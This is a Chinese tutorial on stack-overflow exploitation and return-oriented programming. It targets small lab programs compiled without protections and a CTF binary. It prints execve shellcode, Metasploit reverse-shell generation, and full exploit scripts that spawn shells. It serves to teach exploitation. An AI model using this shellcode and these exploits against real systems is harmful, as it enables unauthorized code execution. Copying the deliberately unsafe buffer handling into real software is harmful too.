



# 从栈溢出到ROP

- ret2shellcode
- ret2text
- ret2libc
- ret2plt
- ret2reg
- ret2csu
- stack pivot
- ret2dl-resolve
- JOP/COP
- 利用infoleak绕过ASLR
- rop构造infoleak绕过ASLR两次溢出
- rop & got hijack
- rop & one-gadget
- rop构造binsh字符串到bss
- rop & mmap/mprotect绕过NX
- ret2dl-resolve & DynELF
- FUZZ爆破
- infoleak绕过PIE
- FUZZ爆破绕过PIE(x86)
- CANARY绕过




## shellcode

- 什么是shellcode

在软件漏洞利用中经常用到的一小段代码，通常用于攻击者启动一个能控制受害机器的shell。例如利用execve系统调用来获得一个高权限的shell。参考资料 http://www.shell-storm.org/shellcode/

- 编写shellcode

![img](images/从栈溢出到ROP/shellcode1.png)

- 测试shellcode

![img](images/从栈溢出到ROP/shellcode2.png)

用内联(inline)汇编测试编写的shellcode，也可以使用汇编器as直接编译汇编代码

- 提取shellcode

objdump -d shellcode反汇编结果如下

![img](images/从栈溢出到ROP/shellcode3.png))

上图方框部分就是编写的shellcode，提取这些指令的机器码如下：

```
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
```

- 测试提取后的shellcode

![img](images/从栈溢出到ROP/shellcode4.png)

上面这段代码中，shellcode存储在全局字符数组中，属于.data section，编译器默认其不可执行，必须加上选项-z execstack，即开启栈/堆/数据段可执行。

- metaspolit常见shellcode

```
payload/linux/x86/shell_reverse_tcp  # linux x86平台反连shellcode，受害者反连至攻击者主机端口，并开启shell
payload/linux/x64/shell_bind_tcp     # 受害者监听某端口，攻击者连接后即可获取shell，linux x64平台
payload/linux/x86/exec               # 启动指定程序，例如/bin/sh
payload/linux/x64/read_file          # 读取指定文件并输出至fd，linux x64平台
payload/windows/shell_reverse_tcp    # windows平台反连shellcode，受害者反连至攻击者主机端口，并开启shell
payload/windows/shell_bind_tcp       # 受害者监听某端口，攻击者连接后即可获取shell，windows平台
```

- metasploit生成shellcode

使用use命令选择一个shellcode模块，此处选择payload/linux/x86/shell_reverse_tcp，linux x86平台下的反连shellcode

generate命令可以生成shellcode

查看选项，可以通过CMD变量名指定命令，默认为/bin/sh，可以通过LHOST和LPORT指定反连IP地址和端口。

![img](images/从栈溢出到ROP/msf1.png)

- 生成shellcode选项

![img](images/从栈溢出到ROP/msf2.png)

-b 指定字符黑名单，通过编码的方式去除不能使用的字符

-e 指定编码器

-t 指定输出格式

-f 指定输出到文件，默认输出到stdout

- 生成包含shellcode的可执行文件ELF

直接生成包含shellcode的可执行文件ELF。本地监听4444端口，运行shellcode，即可在监听端口上获得一个可交互的shell

![img](images/从栈溢出到ROP/msf3.png)

- 生成c语言形式的shellcode

generate -t c生成c语言形式的shellcode

![img](images/从栈溢出到ROP/msf4.png)

- 生成python形式的shellcode

generate -t python生成python语言形式的shellcode

![img](images/从栈溢出到ROP/msf5.png)

- shellcode编码去除坏字符

genetate -b "\x00\x0a"生成的shellcode中通过编码字符"\x00"和字符"\x0a"(换行符)去掉了，在注释中可以看到默认使用的编码器是x86/shikaka_ga_nai

编码器可以使用-e选项更换，例如指定-e alpha_mixed，可以生成混合字母和数字的shellcode

![img](images/从栈溢出到ROP/msf6.png)

- pwntools生成shellcode

pwntools中的shellcraft模块内置了许多的shellcode模板。除了执行shell之外，还能满足许多其他的功能。

```
import pwn
print(pwn.shellcraft.amd64.linux.sh())
```

- pwntools编译shellcode

pwntools可以使用asm函数编译多种架构的shellcode。pwnloads内置的encoders模块也可以帮助编码去除shellcode中的坏字符。

```
import binascii
import pwn
shellcode = pwn.shellcraft.amd64.linux.sh()
print(binascii.b2a_hex(pwn.asm(shellcode, arch='amd64')))
```



## ret2shellcode

- 案例:

```
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv) {
        char buf[128];
        if (argc < 2) return 1;
        strcpy(buf, argv[1]);
        printf("argv[1]: %s\n", buf);
        return 0;
}
```

程序接受命令行第一个参数，如果这个参数过长，strcpy时会溢出栈上缓冲区buf。

作为第一个利用案例，我们不开启战不可执行和canary的保护选项：`-z execstack -fno-stack-protector`

编译命令：`gcc -z execstack -fno-stack-protector boc.c -o bof -m32`

- 栈布局(Stack Layout):

![img](images/从栈溢出到ROP/stack_layout.png)

- 栈溢出(Stack Overflow)

![img](images/从栈溢出到ROP/stack_overflow.png)

- 利用栈溢出

可以把shellcode房子缓冲区开头，然后通过覆盖返回地址跳转至shellcode

![img](images/从栈溢出到ROP/shellcode.png)

也可以吧shellcode放在返回地址之后，返回通过覆盖返回地址跳转至shellcode —— jmp esp，不需要硬编码地址

![img](images/从栈溢出到ROP/stack_layout.png)

- 栈溢出漏洞利用步骤

  + 找到能够刚好覆盖返回地址的缓冲区长度

  + 填充shellcode并找到shellcode所在地址

  + 将返回地址覆盖为shellcode地址

- 寻找填充长度

为了精确覆盖返回地址，首先要找到从缓冲区开头到栈上的返回地址有多少距离。我们可以先找到缓冲区开头的地址，再找到返回地址所在位置，两者相减即可。为了找到缓冲区开头地址，我们可以在调用strcpy之前下断点，通过查看strcpy第一个参数即可。另外，可在main函数返回前断下，此时指向的即是返回地址所在的位置。

```
$ gdb -q --args bof AAAA
Reading symbols from bof ... done.
(gdb) r
Starting program: /home/sh4rk/pwnable/bof AAAA
argv[1]: AAAA
[Inferior 1 (process 20815) exited normally]
pwndbg> disassemble 
Display all 200 possibilities? (y or n)
pwndbg> disassemble main
Dump of assembler code for function main:
   0x080484dc <+0>:    push   %ebp
   0x080484dd <+1>:    mov    %ebp,%esp
   ...
   0x08048508 <+44>:   call   0x80483d0 <strcpy@plt>
   ...
   0x08048527 <+75>:   ret
End of assembler dump.
pwndbg> b *0x08048508                # 在strcpy断点
Breakpoint 1 at 0x08048508
pwndbg> b *0x08048527                # 在ret断点
Breakpoint 2 at 0x08048527
```

在第一个断点处，找到缓冲区起始地址为0xffffd4a0

在第二个断点处，找到返回地址存储位置0xffffd52c

二者相减，即可知道溢出超过140字节时会覆盖返回地址

```
(gdb) r
Starting program: /home/sh4rk/pwnable/bof AAAA
Breakpoint 1, 0x08048508 in main ()
(gdb) x/2wx $esp
0xffffd490:   0xffffd4a0   0xffffd734       # 分别是strcpy的两个参数，第一个参数即为目标缓冲区0xffffd4a0
(gdb) c
Continuing.
argv[1]: AAAA
Breakpoint 2, 0x08048527 in main ()
(gdb) x/wx $esp
0xffffd52c:   0xf7e1f637                    # 此处为返回地址
(gdb) p/d 0xffffd52c - 0xffffd4a0           # 二者相减即可得到偏移
$1 = 140
```

这里也可以通过pwntools的cyclic函数或msf的pattern.py脚本生成一串字符串来定位溢出长度，具体参考后面补充说明。

- 第一个栈溢出漏洞利用

```
$ cat /proc/sys/kernel/randomize_va_space
0                                               # 降低难度，关闭系统地址随机化ASLR保护机制
$ gdb -q --args ./bof $(python -c 'print "A" * 140 + "BBBB"')               
Reading symbols from ./bof...
(No debugging symbols found in ./bof)
(gdb) r
Starting program: /home/sh4rk/pwnable/bof
argv[1]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/20x $esp - 160
0xffffd4a0:     0x080485c0      0xffffd4b0      0x000000c2      0xf7e9562b
0xffffd4b0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd4c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd4d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd4e0:     0x41414141      0x41414141      0x41414141      0x41414141
```

输入140个A加4个B时，返回地址被改成了0x42424242

在程序崩溃时，查看当前esp-160的内存，即可观察到缓冲区开头为0xffffd4b0

在buffer开头放上shellcode并跳转过去即可：

```
 [shellcode][“AAAAAAAAAAAAAA”….][ret]
 ^------------------------------------------------|
```

- 在gdb中获取shell

为了输入不可见字符，我们使用python，在buffer开头放上shellcode，然后将返回地址覆盖成buffer的起始地址0xffffd4b0。

因为采用了小端(little endian)格式，因此返回地址的字节序为"\xb0\xd4\xff\xff"

最终成功执行shellcode获取了shell。

```
$ gdb -q --args ./bof $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * (140 - 24)+ "\xb0\xd4\xff\xff"')
Reading symbols from ./bof...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/sh4rk/pwnable/bof 1Ph//shh/binSᙰAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
argv[1]: 1Ph//shh/binSᙰAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
process 21972 is executing new program: /bin/dash
$ id
uid=1000(sh4rk) gid=1000(sh4rk) groups=1000(sh4rk),27(sudo)
$ 
```

- 在gdb外获取shell

刚才成功利用是在gdb中运行，如果不使用gdb，直接运行，你会发现shellcode无法执行。

实际上，在gdb中运行程序时，gdb会为进程增加许多环境变量，存储在栈上，导致栈用的更多，栈的地址变低了。直接运行时，栈地址会比gdb中高，所以刚才找的shellcode地址就不适用了。

将0xffffd4b0升高为0xffffd4ea，同时在shellcode前面增加长度为60的NOP链，只要命中任何一个NOP即可。

```
$ ./bof $(python -c 'print "\x90" * 60 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "A" * (140 - 60 - 24)+ "\xea\xd4\xff\xff"')                                            # 增加NOP Sled
Reading symbols from ./bof...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/sh4rk/pwnable/bof 1Ph//shh/binSᙰAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
argv[1]: 1Ph//shh/binSᙰAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
process 21972 is executing new program: /bin/dash
$ id
uid=1000(sh4rk) gid=1000(sh4rk) groups=1000(sh4rk),27(sudo)
```

也可以通过开启core dump这个功能定位真实地址。

```
ulimit -c unlimited
sudo sh -c 'echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern'
```

开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。

```
$./bof ABCDAAAAAAAA(...skip...)AAAAAAAAAAA
Segmentation fault (core dumped)

$ gdb bof /tmp/core.1433844471 
Core was generated by `./bof'.
Program terminated with signal 11, Segmentation fault.
#0 0x41414141 in ?? ()

(gdb) x/10s $esp-144
0xbffff290: "ABCD", 'A' <repeats 153 times>, "\n\374\267`\204\004\b"
0xbffff335: ""
```

因为溢出点是140个字节，再加上4个字节的ret地址，我们可以计算出buffer的地址为$esp-144。通过gdb的命令 “x/10s $esp-144”，我们可以得到buf的地址为0xbffff290。



## return to text

使用程序中已有的函数地址覆盖，可以实现调用程序中的函数

**示例代码(x86)**

```
 // 编译：gcc -m32 -fno-stack-protector exploit1.c -o exploit1
 // 关闭地址空间随机化不考虑ASLR绕过
 #include <stdlib.h>
 #include <string.h>

 void foobar() {
  puts("I Should Never Be Called");
  exit(0);
 }

 void vulnerable(char *arg) {
  char buff[10];
  strcpy(buff, arg);
 }

 int main(int argc, char **argv) {
  vulnerable(argv[1]);
  return (0);
 }
```

执行程序的时候函数 ShouldNotBeCalled 一直没有被调用。函数vulnerable只有一个操作就是将成员变量拷贝到只有10bytes大小的缓存buff中。此外我们还将禁用空间格局随机化Address Space Layout Randomization (ASLR)让利用场景变得更简单些。调试如下：

```
 $ ./exploit1 `python -c "print 'A'*22+'\x83\x84\x04\x08'"`
 I Should Never Be Called
```

**示例代码(x64)**

```
// 编译: gcc -fno-stack-protector level3.c -o level3
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void callsystem()
{
    system("/bin/sh");
}

void vulnerable_function() {
    char buf[128];
    read(STDIN_FILENO, buf, 512);
}

int main(int argc, char** argv) {
    write(STDOUT_FILENO, "Hello, World\n", 13);
    vulnerable_function();
}
```

**分析调试**

打开ASLR并编译目标程序。通过分析源码，我们可以看到想要获取这个程序的shell非常简单，只需要控制PC指针跳转到callsystem()这个函数的地址上即可。因为程序本身在内存中的地址不是随机的，所以不用担心函数地址发生改变。定位溢出点：

```
$ python pattern.py create 150 > payload
$ cat payload
Aa0Aa1Aa2Aa(...skip...)7Ae8Ae9
```

然后运行gdb ./level3后输入这串字符串造成程序崩溃。

```
(gdb) run < payload
Starting program: /home/mzheng/CTF/level3 < payload
Hello, World

Program received signal SIGSEGV, Segmentation fault.
0x00000000004005b3 in vulnerable_function ()
```

奇怪的事情发生了，PC指针并没有指向类似于0x41414141那样地址，而是停在了vulnerable_function()函数中。原因就是之前提到过的程序使用的内存地址不能大于0x00007fffffffffff，否则会抛出异常。但是，虽然PC不能跳转到那个地址，我们依然可以通过栈来计算出溢出点。因为ret相当于“pop rip”指令，所以我们只要看一下栈顶的数值就能知道PC跳转的地址了。

```
(gdb) x/gx $rsp       // 查看内存，gx代表数值用64位16进制显示
0x7fffffffe188: 0x3765413665413565

$ python pattern.py offset 0x3765413665413565
hex pattern decoded as: e5Ae6Ae7
136
```

可以看到溢出点为136字节。我们再构造一次payload，并且跳转到一个小于0x00007fffffffffff的地址，看看这次能否控制pc的指针。

```
python -c 'print "A"*136+"ABCDEF\x00\x00"' > payload

(gdb) run < payload
Starting program: /home/mzheng/CTF/level1 < payload
Hello, World

Program received signal SIGSEGV, Segmentation fault.
0x0000464544434241 in ?? ()
```

**Exploit**

```
#!/usr/bin/env python
from pwn import *
elf = ELF('level3')
p = process('./level3')
#p = remote('127.0.0.1',10001)
callsystem = 0x0000000000400584
payload = "A"*136 + p64(callsystem)
p.send(payload)
p.interactive()
```



## return to libc

发生栈溢出时，不跳转到shellcode，而是跳转到libc中的函数，在返回地址处的栈上依次写入system、exit、"bin/sh"字符串地址、0，我们可控函数返回时会如何执行。

![img](images/从栈溢出到ROP/ret2libc1.png)

函数返回，栈上返回地址处已被改为system()函数地址

![img](images/从栈溢出到ROP/ret2libc2.png)

返回后跳转到system执行，esp指向exit

![img](images/从栈溢出到ROP/ret2libc3.png)

对于system()函数，栈上的"/bin/sh"正好为第一个参数

![img](images/从栈溢出到ROP/ret2libc4.png)

system返回时，栈上对应的返回地址为exit()函数，进而执行exit(0)

![img](images/从栈溢出到ROP/ret2libc5.png)

- 栈溢出的return to libc利用实践
  - 获得system()和exit()函数地址
  - 获得"/bin/sh"字符串地址
  - 构造溢出载荷 `system + exit + "/bin/sh" + 0`
  - 实验在关闭ASLR情况下进行，libc函数地址固定不变

- 获得system()与exit()函数地址

可以在gdb中直接用print命令查看system和exit函数地址

```
$ gdb -q --args ./bof $(python -c 'print "A" * 140 + "BBBB"')
Reading symbols from ./bof...(no debugging symbols found)...done.
(gdb) r
Starting program: /home/sh4rk/pwnable/bof AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
argv[1]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e3fd80 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e339b0 <__GI_exit>
(gdb) 
```

- 查找glibc中字符串"/bin/sh"的地址

  glibc中必定有字符串"/bin/sh"，可以使用gdb中find命令，在libc的内存范围内搜索。0xf7e05000是libc起始地址，0xf7fb8000是结尾。

  ```
  (gdb) info proc mappings
  process 22429
  Mapped address spaces:
      Start Addr  End Addr    Size   Offset objfile
       0x8048000 0x8049000   0x1000    0x0 /home/sh4rk/pwnable/bof
       0x8049000 0x804a000   0x1000    0x0 /home/sh4rk/pwnable/bof
       0x804a000 0x806b000  0x21000    0x0 [heap]
      0xf7e05000 0xf7fb4000  0x1af000    0x0 /lib/i386-linux-gnu/libc-2.23.so         # 起始地址 0xf7e05000
      0xf7fb4000 0xf7fb5000   0x1000  0x1af000 /lib/i386-linux-gnu/libc-2.23.so
      0xf7fb5000 0xf7fb7000   0x2000  0x1af000 /lib/i386-linux-gnu/libc-2.23.so
      0xf7fb7000 0xf7fb8000   0x1000  0x1b1000 /lib/i386-linux-gnu/libc-2.23.so       # 结束地址 0xf7fb8000
      ...
      0xfffdd000 0xffffe000  0x21000    0x0 [stack]
  (gdb) find /b 0xf7e05000, 0xf7fb8000, '/', 'b', 'i', 'n', '/', 's', 'h', 0
  0xf7f60a3f
  1 pattern found.
  (gdb) x/s 0xf7f60a3f
  0xf7f60a3f:   "/bin/sh"
  (gdb) 
  ```

  在libc中搜索字符串，还可以通过如下方式确定搜索范围

  ```
  (gdb) print __libc_start_main
  $2 = {<text variable, no debug info>} 0xb7e393f0 <__libc_start_main>
  (gdb) find 0xb7e393f0, +2200000, "/bin/sh"
  0xb7f81ff8
  warning: Unable to access target memory at 0xb7fc8500, halting search.
  1 pattern found.
  (gdb) x/s 0xb7f81ff8
  0xb7f81ff8: "/bin/sh"
  ```

- 获取地址的另一种方法
  
  - 首先用ldd命令获取libc基址
  - 然后用readelf命令找到system和exit函数在libc中的偏移
  - 用strings命令找到字符串/bin/sh在libc中的偏移
  - 最后通过与libc基址相加来获得最终地址。
  
  ```
  $ ldd bof
          linux-gate.so.1 =>  (0xf7ffd000)
          libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7e05000)
          /lib/ld-linux.so.2 (0x56555000)
  $ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
     ...
   1457: 0003ab80  55 FUNC  WEAK  DEFAULT  13 system@@GLIBC_2.0
     ...
  $ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
     ...
    141: 0002e9b0  31 FUNC  GLOBAL DEFAULT  13 exit@@GLIBC_2.0
     ...
  $ strings -tx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
   15ba3f /bin/sh
  $ gdb -q
  (gdb) p/x 0xf7e05000 + 0x0003ab80
  $1 = 0xf7e3fd80
  (gdb) p/x 0xf7e05000 + 0x0002e9b0
  $2 = 0xf7e339b0
  (gdb) p/x 0xf7e05000 + 0x15ba3f
  $3 = 0xf7f60a3f
  (gdb) 
  ```

把获得的system、exit、"/bin/sh"的地址填入溢出缓冲区，从前一课时计算到的偏移140之后开始填入。通过gdb运行发现shell并未启动，原因是："/bin/sh"的地址中包含换行符0a，argv[1]会被换行符截断。

```
$ gdb -q --args ./bof $(python -c 'print "A" * 140 + "\x80\xfd\xe3\xf7" + "\xb0\x39\xe3\xf7" + "\x3f\x0a\xf6\xf7" + "\0\0\0\0"')           # "/bin/sh"地址中包含0x0a(\n)
Reading symbols from ./bof...(no debugging symbols found)...done.
(gdb) b *0x08048527
Breakpoint 1 at 0x08048527
(gdb) r
argv[1]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
Breakpoint 1, 0x08048527 in main ()
(gdb) x/20x $esp
0xffffd51c:     0xf7e3fd80      0xf7e339b0      0xffff003f      0xffffd5c4  # 地址被截断为0xffff003f
0xffffd52c:     0x00000000      0x00000000      0x00000000      0xf7fb7000
...
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e3fd80 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e339b0 <__GI_exit>
(gdb) 
```

这时候可以考虑更换命令字符串，使用"sh\0"，一般来说PATH环境变量中已经包含/bin目录，因此只需要找到一个"sh"字符串，将其地址作为system()函数的参数即可。我们在程序自身空间内就可以找到"sh"这个字符串，同样使用find命令，实际上，此处的sh是".gnu.hash"这个字符串中的一部分。

```
(gdb) info proc mappings 
process 29788
Mapped address spaces:

    Start Addr  End Addr    Size   Offset objfile
     0x8048000 0x8049000   0x1000    0x0 /home/sh4rk/pwnable/bof
     0x8049000 0x804a000   0x1000    0x0 /home/sh4rk/pwnable/bof
     0x804a000 0x806b000   0x21000   0x0 [heap]
(gdb) find /b 0x8048000, 0x8049000, 's', 'h', 0
0x8048d79
1 pattern found.
(gdb) x/s 0x8048d79
0x8048d79:   "sh"
(gdb) x/s 0x8048d72
0x8048d72:   ".gnu.hash"
```

- 第一个使用return to libc的exploit

更换命令地址后，便可成功使用return to libc启动shell

```
$ ./bof $(python -c 'print "A" * 140 + "\x80\xfd\xe3\xf7" + "\xb0\x39\xe3\xf7" + "\x79\x8d\x04\x08" + "\0\0\0\0"')
argv[1]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
$ id
uid=1000(sh4rk) gid=1000(sh4rk) groups=1000(sh4rk),27(sudo)
$ 
```

> 要使用'/bin/sh'等字符串也可以不用在libc或其他地方搜索，可以通过ROP调用read等函数在.bss段首地址处构造，这里是全局变量的地方，地址固定方便定位，可以用于存储字符串等数据。

> 上面案例通过命令行传入地址带0x20,0x0a等特殊字符被截断，除了按上面尝试换用其他可选地址外，另一种简单做法是将相关参数放入双引号内

**案例：ret2libc**

开启ASLR情况下，libc加载地址不固定，无法硬编码地址完成ret2libc，下面案例给我们泄露的libc地址：

```
int main(int argc, char *argv[])
{
 char buf[32];
 setvbuf(stdin, 0, 2, 0);
 setvbuf(stdout, 0, 2, 0);
 setvbuf(stderr, 0, 2, 0);
 puts("Welcome to ret2libc demo!");
 printf("This is your gift: %p\n", &setvbuf);
 read(0, buf, 0x100);
 return 0;
}
```

很明显的栈溢出，并且给泄露了setvbuf，不用自己去leak libc了，可以用来计算出libc的地址：

```
libc_base = setvbuf_addr - setvbuf_offset
```

查看一些基本信息：

```
$ ldd ret2libc # 查看使用的libc.so路径
$ file ret2libc # 查看文件信息
peda-gdb > checksec # 查看保护
Arch: i386-32-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: PIE enabled
```

**Exploit**

```
from pwn import *
elf = ELF("./ret2libc")
libc = elf.libc
io = process("./ret2libc")
pause()
io.recvutil('This is your gift: ')
sendvbuf_addr = int(io.recvline().strip(), 16)
libc_base = setvbuf_addr - libc.sym['setvbuf']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + libc.search("/bin/sh\x00").next()
payload = "A"*0x68 + "B"*4
payload += p32(system_addr)
payload += "CCCC"
payload += p32(binsh_addr)
io.send(payload)
io.interactive()
```

## return to plt

在地址随机化保护开启情况下，libc的加载地址是不确定的，也就无法硬编码libc中的system地址或字符串地址。虽然libc，stack，heap的地址都是随机的，但在pie关闭情况下，程序镜像本身在内存中的地址都是固定的，所以只要把返回值设置到程序本身就可执行我们期望的指令了。所以可以直接通过可执行程序plt中的函数地址完成相关函数调用。例如调用write@plt函数地址，就相当于调用libc中的write函数地址，而无需知道实际libc函数地址。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plt()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plt()会根据write.got 跳转到真正的write()函数上去。（细节可参考《程序员的自我修养 - 链接、装载与库》这本书）

通过这种方式可以进一步构造rop链，参考后面的示例。

## return to reg

前面已经提到，使用jmp esp\call esp\call eax之类的指令地址覆盖来完成跳转，即ret2reg，可以避免硬编码shellcode地址，可用于绕过ASLR。

> ASLR开启时，只是栈、堆、动态库随机化，程序本身本身的加载地址依然固定。

**示例**

> 案例来自重庆邮电大学举办的cctf2015中pwn的第一题，见附件`cctf2015_pwn1.rar`

**分析调试**

经过IDA逆向分析可知是一个普通的缓冲区栈溢出漏洞

```
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
   __int64 v3; // rdx@1
   char v5; // [sp+0h] [bp-1020h]@1
   char v6; // [sp+1000h] [bp-20h]@1
   int v7; // [sp+101Ch] [bp-4h]@1

   setbuf(stdin, 0LL, envp);
   setbuf(stdout, 0LL, v3);
   puts("Easyest stack overflow!");
   v7 = read(0LL, &v5, 4096LL);
   return memcpy(&v6, &v5, v7);
 }
```

 $ cat /proc/sys/kernel/randomize_va_space # 显示为2，本机开启了ALSR

这时候使用硬编码地址的话,就无法成功利用漏洞.在这种情况下就可以使用jmp rsp等跳转地址来覆盖返回地址简介跳入shellcode。当函数执行完,弹出了返回地址,rsp往往指向(返回地址+8),我们将shellcode放在此处就可以让程序执行,注意跳板不一定是rsp

经过测试如下payload可以触发，并定位到覆盖地址位置，注意是64位程序，所以返回地址是8个字节：

```
python -c "print 'A' * 40 + 'BBBBBBBB' + 'C' * 100" 
```

用gdb的peda插件checksec功能来检测目标程序的防护措施以及jmpcall命令搜索jmp rsp的地址：

```
 gdb-peda$ checksec
 CANARY : disabled
 FORTIFY : disabled
 NX : disabled
 PIE : disabled
 RELRO : Partial
 gdb-peda$ jmpcall rsp
 0x43687d : call rsp
 0x43688b : call rsp
 0x43e9d4 : call rsp
 0x441b85 : call rsp
 0x441d8a : call rsp
```

从checksec结果看程序本身没有任何防护措施，跳转地址就选第一个0x43687d : call rsp即可，jmp rsp也是可以的。

看下返回之后，rsp也刚好指向返回地址后面的内存，刚好可以放上shellcode

```
 RSP: 0x7fffffffdc80 ('C' <repeats 17 times>, "\n\377\377\377\177")
 RIP: 0x7fffffffdc80 ('C' <repeats 17 times>, "\n\377\377\377\177")
```

另外就是shellcode，可以使用msf来生成。

```
 msf> show payload   
 msf> use linux/x64/exec
 msf (linux/x64/exec)> set cmd /bin/sh
 msf (linux/x64/exec)> generate -t py -b "/x00"
```

**Exploit**

```
#!/usr/bin/env python
from zio import *
io = zio("./cctf2015_pwn1")
io.read_until("Easyest stack overflow!\n")

buf = ""
buf += "\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
buf += "\xef\xff\xff\xff\x48\xbb\xab\xb5\xd9\xba\x45\x0a\xfd"
buf += "\x44\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += "\xc1\x8e\x81\x23\x0d\xb1\xd2\x26\xc2\xdb\xf6\xc9\x2d"
buf += "\x0a\xae\x0c\x22\x52\xb1\x97\x26\x0a\xfd\x0c\x22\x53"
buf += "\x8b\x52\x4d\x0a\xfd\x44\x84\xd7\xb0\xd4\x6a\x79\x95"
buf += "\x44\xfd\xe2\x91\x33\xa3\x05\xf8\x44"

payload = 'A' * 40 + '\x7d\x68\x43\x00\x00\x00\x00\x00' + buf
io.write(payload)
io.interact()
```



## ROP (Return Oriented Programming)

在前面利用return to libc，我们调用了system("/bin/sh")和exit(0)，system()和exit()函数本质上都是以ret指令结尾的代码片段，考虑如果是其他ret结尾的代码片段，例如几条指令组成的小代码片段，也是同样可行的。

![img](images/从栈溢出到ROP/rop.png)

- ROP (Return Oriented Programming)
  - 通过拼接以ret指令结尾的代码片段来实现某些功能的技术，成为ROP(Return Oriented Programming)
  - 以ret指令结尾的小段代码片段我们成为ROP gadget，例如：pop edx; ret
  - 为实现某一功能拼接而成的多个ROP gadget，我们成为ROP链(ROP Chain)
  - 在栈上(从返回地址开始)填充的用于执行ROP链的数据，我们成为ROP载荷(ROP Payload)
  - ROP技术是return to libc的扩展，return to libc是ROP的一种特殊情况，即ROP gadget恰好是libc函数的情形。

- ROP链的执行过程

这是由3个gadget组成的ROP链，栈溢出函数返回后依次执行。

第一个gadget会把栈上的值放入寄存器edx，栈上的值可控，因此edx可控。

第二个gadget将eax置为0

第三个gadget将eax写入edx指向的内存，eax为0，edx可控，此rop实现了任意地址写0的功能。

![img](images/从栈溢出到ROP/rop1.png)

![img](images/从栈溢出到ROP/rop2.png)

![img](images/从栈溢出到ROP/rop3.png)

![img](images/从栈溢出到ROP/rop4.png)



- 常规ROP链布局

x86 ROP链示意图：

假设先调用FUN1再调用FUN2，FUN1有三个参数，FUN2有两个参数

考虑x86调用约定中，函数用栈来传递参数

```
[ FUNC1_PTR ]
[  PPP_RET  ]        // pop; pop; pop; ret；对应三个参数故需要3个pop
[ FUNC1_ARG1]
[ FUNC1_ARG2]
[ FUNC1_ARG3]
[ FUNC2_PTR ]
[  PP_RET   ]        // pop; pop; ret；对应两个参数故需要2个pop
[ FUNC2_ARG1]
[ FUNC2_ARG2]
```

最简单的调用system("/bin/sh")的ROP链如下：

```
ROP_CHAIN = system_ptr + exit_ptr + bin_sh_addr
```

x64:

考虑x64调用约定中，前六个参数依次保存在RDI, RSI, RDX, RCX, R8和 R9中，如果还有更多的参数的话才会保存在栈上。

```
[ POP; RET ]         // pop rdi; ret
[   ARG1   ]
[ POP; RET ]         // pop rsi; ret
[   ARG2   ]
[   ....   ]
[ FUNC_PTR ]         // FUNC(rdi, rsi, ...)
```



- 连接多个libc函数调用

依次在栈上布置system、exit、binsh、0，即可连续调用system("/bin/sh")和exit(0)。

如何串联3次或更多的libc函数调用? 如果libc函数有2个以上参数，如何布置ROP payload。

例如要连接read(fd, buf, size)和write(fd, buf, size)两个函数调用，无法按照system("/bin/sh")和exit(0)那样布置ROP payload，参数会产生重叠。

![img](images/从栈溢出到ROP/ret2libc_func1.png)

使用pop ret这类的ROP Gadget可以解决这个问题，例如：

```
pop ebx; pop esi; pop edi; ret;
```

这种3个pop的gadget下文记为pop3 ret


我们用pop3 ret代表3个pop的gadget，例如：pop ebx; pop esi; pop edi; ret;
按照右图的布置，我们可以用ROP连续调用read和write函数。

pop3 ret可以在read/write函数返回时，清理栈上的参数，进而触发下一次调用
2个参数的libc函数可以使用pop 2 ret
1个参数的libc函数可以使用pop ret

![img](images/从栈溢出到ROP/ret2libc_func2.png)

![img](images/从栈溢出到ROP/ret2libc_func3.png)

